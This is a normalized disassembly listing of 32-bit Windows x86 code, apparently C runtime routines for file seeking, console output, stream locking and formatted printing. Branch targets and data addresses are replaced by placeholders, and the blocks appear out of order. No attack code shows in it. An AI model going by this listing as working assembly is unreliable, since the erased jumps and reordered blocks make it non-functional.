pop esi
pop ebx
pop ebp
retn
sub_100268a0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_100200d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_10026810
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_10026850
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1002695c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_10028fec
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_1001bddd
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_1001be03
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_100269e1
push 0x14
push r--data
call sub_10020070
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1001bdf0
and [ eax ] 0x0
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001bdf0
and [ eax ] 0x0
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001ea75
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_100200b5
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_10029055
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001bdf0
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002695c
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10026ac1
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_10026acb
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_10028cb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_1001bdf0
mov [ eax ] edi
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1001a809
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_1001bdf0
and [ eax ] 0x0
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
jmp r-xdata
push esi
call sub_100272e5
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_1002695c
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_1001e316
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_1001bddd
mov [ eax ] 0x1c
call sub_1001bdf0
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_1001be03
pop ecx
jmp r-xdata
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001bdf0
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_100276d6
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_1002911b
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_10028c24
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_10028c24
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_1002911b
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_100271c8
push 0x10
push r--data
call sub_10020070
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1001bdf0
and [ eax ] 0x0
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001bdf0
and [ eax ] 0x0
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001ea75
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_100200b5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10029055
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001bdf0
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_10026acb
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10027294
mov eax [ ebp - 0x1c ]
sub_1002729c
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_1001bcbc
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_100272e5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001ea75
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_10027341
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_1001bd01
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_1001bd01
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_10027412
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_10023fbf
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_10027453
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_10023fbf
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_10027485
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_10023ee6
pop ecx
pop ebp
retn
sub_100274c1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_10023ee6
pop ecx
pop ebp
retn
sub_100274f0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
or eax 0xffffffff
pop ebp
retn
sub_1002752c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
call sub_1001ea75
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_1001bddd
mov [ eax ] 0x2a
call sub_1001bddd
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_1001bddd
push 0x22
pop esi
mov [ eax ] esi
call sub_1001ea75
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_1001a9b0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_1001a9b0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_1002769e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100276e9
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_1001f13e
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_1002771c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx ecx
call sub_1001bddd
test [ edi + 0xc ] 0x40
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_1001bddd
and [ eax ] 0x0
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test ebx ebx
jg r-xdata
add [ esi ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
mov ecx edi
dec ebx
call sub_100276e9
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
call sub_1001bddd
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
leave
retn
call sub_1001bddd
cmp [ eax ] 0x2a
jne r-xdata
call sub_1001bddd
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov ecx edi
mov al 0x3f
call sub_100276e9
sub_10027790
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x258 ] esi
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x238 ] eax
call sub_1001b46f
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
cmp [ ebp - 0x244 ] 0x0
je r-xdata
xor esi esi
cmp edi esi
je r-xdata
push esi
call sub_100274f0
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ edi ]
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x220 ] esi
mov [ ebp - 0x240 ] esi
mov [ ebp - 0x254 ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
cmp [ ebp - 0x244 ] 0x0
je r-xdata
inc edi
mov [ ebp - 0x23c ] edi
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x240 ] 0x0
je r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x240 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x240 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x240 ] eax
cmp eax esi
je r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov edi [ ebp - 0x23c ]
mov al [ edi ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_10028340 ]
mov ebx [ ebp - 0x228 ]
xor esi esi
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x26c ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x238 ] 0x0
lea eax [ ebp - 0x250 ]
push eax
movzx eax dl
push eax
call sub_1002769e
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x234 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x234 ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x228 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x234 ] ebx
test ebx ebx
jns r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x228 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x218 ] ebx
test ebx ebx
jns r-xdata
mov al [ edi ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x258 ]
lea esi [ ebp - 0x224 ]
